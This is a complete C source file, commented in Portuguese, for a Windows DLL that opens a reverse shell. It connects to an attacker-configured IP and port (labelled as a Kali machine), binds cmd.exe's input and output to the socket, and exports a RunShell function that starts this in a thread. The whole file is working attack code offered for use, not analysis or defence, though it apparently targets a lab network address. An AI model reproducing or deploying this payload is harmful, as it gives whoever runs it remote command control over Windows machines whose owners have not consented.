// dll/shell_reverse.c - DLL Reverse Shell para Windows
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")

// ============================================
// CONFIGURAÇÕES (MUDE AQUI)
// ============================================
#define REMOTE_IP "192.168.1.100"  // ← IP DO SEU KALI
#define REMOTE_PORT 4444

DWORD WINAPI ReverseShell(LPVOID lpParam) {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    
    WSAStartup(MAKEWORD(2,2), &wsaData);
    
    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    
    server.sin_family = AF_INET;
    server.sin_port = htons(REMOTE_PORT);
    server.sin_addr.s_addr = inet_addr(REMOTE_IP);
    
    WSAConnect(sock, (SOCKADDR*)&server, sizeof(server), NULL, NULL, NULL, NULL);
    
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
    
    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    
    closesocket(sock);
    WSACleanup();
    return 0;
}

__declspec(dllexport) void RunShell(void) {
    CreateThread(NULL, 0, ReverseShell, NULL, 0, NULL);
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    return TRUE;
}